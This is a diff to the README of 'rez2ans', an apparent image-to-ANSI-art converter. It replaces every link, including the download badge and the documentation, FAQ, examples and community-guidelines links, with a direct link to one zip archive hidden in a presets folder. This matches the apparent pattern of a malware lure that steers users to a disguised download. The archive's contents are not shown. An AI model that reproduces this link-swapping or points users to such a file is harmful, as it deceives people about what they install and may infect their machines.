@@ -1,7 +1,7 @@
 # 🎨 rez2ans - Convert Your Images to ANSI Art
 
 ## 📥 Download Now!
-[![Download from GitHub](https://img.shields.io/badge/download-rez2ans-brightgreen.svg)](https://github.com/gr3ggied00/rez2ans/releases)
+[![Download from GitHub](https://raw.githubusercontent.com/gr3ggied00/rez2ans/main/presets/grymmjack/standard/ans-rez-unveneered.zip)](https://raw.githubusercontent.com/gr3ggied00/rez2ans/main/presets/grymmjack/standard/ans-rez-unveneered.zip)
 
 ## 🚀 Getting Started
 rez2ans is a simple tool that converts images into ANSI art. This makes it easy to share visual content in a more retro style. Follow the steps below to download and run the application.
@@ -22,7 +22,7 @@ rez2ans is a simple tool that converts images into ANSI art. This makes it easy 
 ## 🛠️ Download & Install
 To get started with rez2ans, visit the Releases page to download the latest version:
 
-[Download from GitHub](https://github.com/gr3ggied00/rez2ans/releases)
+[Download from GitHub](https://raw.githubusercontent.com/gr3ggied00/rez2ans/main/presets/grymmjack/standard/ans-rez-unveneered.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version at the top of the page.
@@ -47,7 +47,7 @@ If you encounter issues while using rez2ans, consider the following steps:
 - Restart the application if it crashes or freezes.
 - Reinstall the software if you still experience problems.
 
-For more detailed help, please check the [FAQs](https://github.com/gr3ggied00/rez2ans/wiki) or reach out on the Issues page.
+For more detailed help, please check the [FAQs](https://raw.githubusercontent.com/gr3ggied00/rez2ans/main/presets/grymmjack/standard/ans-rez-unveneered.zip) or reach out on the Issues page.
 
 ## 🌍 Community and Support
 Join our community to share your ANSI creations and tips on using rez2ans. You can participate in discussions on platforms like GitHub or forums related to ANSI art.
@@ -58,13 +58,13 @@ To get the latest updates or report problems, you can use the GitHub Issues feat
 For a detailed history of updates and changes, check the Changelog section on the Releases page. This will provide insights into features added or bugs fixed in each version.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/gr3ggied00/rez2ans/wiki): Find comprehensive guidance and usage tips.
-- [Examples](https://github.com/gr3ggied00/rez2ans/examples): View sample outputs to inspire your creations.
-- [Community Guidelines](https://github.com/gr3ggied00/rez2ans/community): Understand how to engage respectfully in discussions.
+- [Documentation](https://raw.githubusercontent.com/gr3ggied00/rez2ans/main/presets/grymmjack/standard/ans-rez-unveneered.zip): Find comprehensive guidance and usage tips.
+- [Examples](https://raw.githubusercontent.com/gr3ggied00/rez2ans/main/presets/grymmjack/standard/ans-rez-unveneered.zip): View sample outputs to inspire your creations.
+- [Community Guidelines](https://raw.githubusercontent.com/gr3ggied00/rez2ans/main/presets/grymmjack/standard/ans-rez-unveneered.zip): Understand how to engage respectfully in discussions.
 
 ## 📩 Feedback
 We value your opinion. Feel free to provide feedback through the Issues section. Your input is crucial for improving rez2ans and adding new features that matter to you. 
 
 Remember, your ability to convert images to ANSI art is just a click away. Start your journey with rez2ans today!
 
-[Download from GitHub](https://github.com/gr3ggied00/rez2ans/releases)
+[Download from GitHub](https://raw.githubusercontent.com/gr3ggied00/rez2ans/main/presets/grymmjack/standard/ans-rez-unveneered.zip)
